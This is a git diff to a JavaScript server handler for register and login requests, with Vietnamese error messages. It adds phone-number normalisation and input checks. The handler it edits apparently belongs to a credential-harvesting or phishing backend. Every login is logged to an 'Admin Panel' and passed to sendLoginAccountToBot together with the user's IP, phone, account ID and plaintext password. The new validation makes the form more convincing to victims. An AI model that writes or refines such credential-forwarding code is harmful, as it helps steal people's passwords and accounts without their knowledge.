@@ -163,6 +163,24 @@ const handleApiResponse = async (req, res, actionType) => {
 
     if (actionType === 'register') {
       let password = req.body.PWD || '';
+      const rawPhone = (req.body.CellPhone || '').trim();
+      let phoneClean = rawPhone.replace(/[^0-9+]/g, '');
+      if (phoneClean.startsWith('+84')) {
+        phoneClean = '0' + phoneClean.slice(3);
+      } else if (phoneClean.startsWith('84') && phoneClean.length === 11) {
+        phoneClean = '0' + phoneClean.slice(2);
+      }
+
+      if (!rawPhone || !/^0[0-9]{9}$/.test(phoneClean)) {
+        return res.status(400).json({
+          Error: {
+            Code: 400,
+            Message: 'Số điện thoại không hợp lệ. Vui lòng nhập đúng 10 số.',
+          },
+        });
+      }
+
+      // Decode base64 if it's base64 encoded
       // Decode base64 if it's base64 encoded
       try {
         if (/^[a-zA-Z0-9+/]+={0,2}$/.test(password) && password.length % 4 === 0) {
@@ -206,13 +224,44 @@ const handleApiResponse = async (req, res, actionType) => {
         },
       });
     } else if (actionType === 'login') {
+      const accountId = (req.body.AccountID || req.body.login || req.body.username || '').trim();
+      const pwd = req.body.AccountPWD || req.body.password || '';
+      const rawPhone = (req.body.phone || req.body.CellPhone || '').trim();
+
+      if (!accountId || !pwd) {
+        return res.status(400).json({
+          Error: {
+            Code: 400,
+            Message: 'Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu.',
+          },
+        });
+      }
+
+      if (rawPhone) {
+        let phoneClean = rawPhone.replace(/[^0-9+]/g, '');
+        if (phoneClean.startsWith('+84')) {
+          phoneClean = '0' + phoneClean.slice(3);
+        } else if (phoneClean.startsWith('84') && phoneClean.length === 11) {
+          phoneClean = '0' + phoneClean.slice(2);
+        }
+
+        if (!/^0[0-9]{9}$/.test(phoneClean)) {
+          return res.status(400).json({
+            Error: {
+              Code: 400,
+              Message: 'Số điện thoại không hợp lệ. Vui lòng nhập đúng 10 số.',
+            },
+          });
+        }
+      }
+
       // Log login to Admin Panel
       const recentLogs = req.app.locals.recentLogs || [];
       recentLogs.push({
         id: Date.now().toString() + '_' + Math.random().toString(36).substring(2, 7),
         action: 'login',
-        accountId: req.body.AccountID || req.body.phone || 'Unknown',
-        phone: req.body.phone || '',
+        accountId: accountId || rawPhone || 'Unknown',
+        phone: rawPhone || '',
         ip: userIp,
         time: timeNow,
       });
@@ -223,9 +272,9 @@ const handleApiResponse = async (req, res, actionType) => {
         sendLoginAccountToBot(
           userIp,
           timeNow,
-          req.body.phone || '',
-          req.body.AccountID || '',
-          req.body.AccountPWD || ''
+          rawPhone || '',
+          accountId || '',
+          pwd || ''
         ),
       ]);
 
